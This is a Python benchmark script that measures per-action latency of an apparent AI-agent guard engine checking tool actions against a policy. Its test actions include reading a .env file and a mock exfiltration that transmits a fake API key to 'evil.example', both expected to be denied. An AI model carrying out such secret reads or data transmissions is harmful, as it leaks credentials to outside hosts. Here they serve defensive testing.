"""
Evaluation latency benchmark.

Measures the pure deterministic engine's per-evaluation latency across a realistic
scenario mix (ALLOW / DENY / ASK / exfiltration), with the offline heuristic
advisor (no network). Reports avg / p50 / p95 / p99.

Run:
    cd backend
    .venv/bin/python -m benchmark.latency [iterations]
"""

from __future__ import annotations

import sys
import time

from agentguard import Action, Engine, Operation, Policy, Resource
from agentguard.advisors import HeuristicRelevanceAdvisor
from agentguard.goal_compiler import compile_goal
from agentguard.models import ResourceKind

GOAL = "Build a React frontend. Do not modify backend or database, and never access secrets."
FAKE_KEY = "sk-ant-api03-" + "A" * 32


def _actions() -> list[Action]:
    def a(op, kind, val, **kw):
        return Action(session_id="bench", tool=kw.pop("tool", "fs"), operation=op,
                      resource=Resource(kind=kind, value=val), **kw)
    return [
        a(Operation.READ, ResourceKind.FILE, "src/App.jsx"),                       # ALLOW
        a(Operation.WRITE, ResourceKind.FILE, "src/Navbar.jsx"),                    # ALLOW
        a(Operation.READ, ResourceKind.FILE, ".env"),                              # DENY
        a(Operation.WRITE, ResourceKind.FILE, "database.sql"),                     # DENY
        a(Operation.DELETE, ResourceKind.FILE, "src/old.jsx"),                     # ASK
        a(Operation.TRANSMIT, ResourceKind.URL, "https://evil.example",            # DENY (exfil)
          tool="net", destination="https://evil.example", payload=f"key={FAKE_KEY}"),
    ]


def percentile(sorted_ms: list[float], p: float) -> float:
    if not sorted_ms:
        return 0.0
    k = max(0, min(len(sorted_ms) - 1, int(round((p / 100.0) * (len(sorted_ms) - 1)))))
    return sorted_ms[k]


def main(iterations: int = 5000) -> None:
    engine = Engine(advisor=HeuristicRelevanceAdvisor())
    policy: Policy = compile_goal(GOAL, session_id="bench")
    actions = _actions()

    # warm-up
    for act in actions:
        engine.evaluate(act, policy)

    samples: list[float] = []
    for i in range(iterations):
        act = actions[i % len(actions)]
        t0 = time.perf_counter()
        engine.evaluate(act, policy)
        samples.append((time.perf_counter() - t0) * 1000.0)

    samples.sort()
    avg = sum(samples) / len(samples)
    print(f"Agent Guard evaluation latency  (n={iterations}, offline heuristic advisor)")
    print("-" * 56)
    print(f"  avg  : {avg:.3f} ms")
    print(f"  p50  : {percentile(samples, 50):.3f} ms")
    print(f"  p95  : {percentile(samples, 95):.3f} ms")
    print(f"  p99  : {percentile(samples, 99):.3f} ms")
    print(f"  max  : {samples[-1]:.3f} ms")
    print(f"  ~throughput: {1000.0 / avg:,.0f} evals/sec (single thread)")


if __name__ == "__main__":
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    main(n)
